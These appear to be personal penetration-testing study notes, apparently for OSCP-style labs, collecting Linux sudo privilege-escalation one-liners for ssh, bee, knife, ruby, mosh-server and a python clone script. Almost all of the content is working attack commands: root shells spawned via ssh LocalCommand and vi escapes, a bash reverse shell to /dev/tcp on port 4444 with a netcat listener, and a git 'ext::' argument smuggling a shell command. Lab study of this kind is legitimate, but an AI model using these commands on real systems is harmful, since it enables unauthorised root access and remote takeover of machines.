
https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html

https://gtfobins.org/

---

/usr/bin/ssh

```
sudo /usr/bin/ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh josh@10.129.229.88
```

ssh -o can make permitlocalcommand=yes, which allow u to run /bin/sh leading to root

---

/usr/local/bin/bee

[[Bee]]

```
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami && id');"
```

---

[[Knife]]

/usr/bin/knife

```
sudo knife data bag create 1 2 -e vi
```

This opens up the vim editor. We type the below character sequence in the editor to get a shell as root.

```
:!/bin/sh
```

---

[[Ruby]]

```
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

executes whatever is inside dependencies.yml

---

**Priv Esc - when /mosh-server can run without password**

```
mosh --server="sudo /usr/bin/mosh-server" localhost
```

or 

// use any port between 60000 and 61000 and executes the user's login shell.
// lists out a MOSH_Key  - use it in next command 
sudo /usr/bin/mosh-server new -p 60013

MOSH_KEY=RmYsRZ1ch9feXBDfpY53jA mosh-client 127.0.0.1 60013

---

/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `echo "bash -i >& /dev/tcp/${KaliIP}/4444 0>&1" > /tmp/shell.sh`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
nc -lvnp 4444
```

```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
```

---

/usr/bin/bash /opt/ghost/clean_symlink.sh

[[ghost symlink]]

---